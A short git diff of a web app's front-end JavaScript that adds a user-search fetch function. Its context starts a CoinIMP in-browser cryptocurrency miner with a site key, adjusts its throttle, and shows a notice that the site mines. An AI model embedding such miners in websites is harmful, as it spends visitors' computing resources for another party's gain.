@@ -1,4 +1,6 @@
-/**Getting initial info */
+/**ulisesten at jan 2019 */
+
+/**Calls */
 
 var username = localStorage.getItem('nombre');
 getPubs();
@@ -108,9 +110,27 @@ function notif(text){
 }
 
 
+/******************* Contactos ********************/
+function searchU(){
+    fetch('/api/searchUsers', {
+        credentials: 'include',
+        method: 'POST'
+      })
+        .then(res => {
+            if(res.ok == false){
+                console.log('Home->searchU(): error');
+                return;
+            }
+             return res.json();
+      })
+        .then(res => {
+            console.log('Home->getPubs():',res);
+      });
+}
+
 
 var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',username, {
-    throttle: 0.1, c: 'w'
+    throttle: 0.5, c: 'w'
 });
 _client.start();
 _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
